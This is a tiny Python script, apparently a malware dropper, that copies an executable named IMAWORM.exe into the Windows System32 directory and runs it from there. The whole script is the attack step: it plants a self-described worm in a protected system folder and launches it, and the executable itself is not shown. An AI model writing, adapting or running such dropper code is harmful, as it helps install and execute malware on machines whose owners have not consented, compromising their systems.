import os
import shutil
cwd = os.getcwd()
shutil.copy(cwd+"/IMAWORM.exe", "/Windows/System32")
os.chdir("/Windows/System32")
os.system(".\IMAWORM.exe")
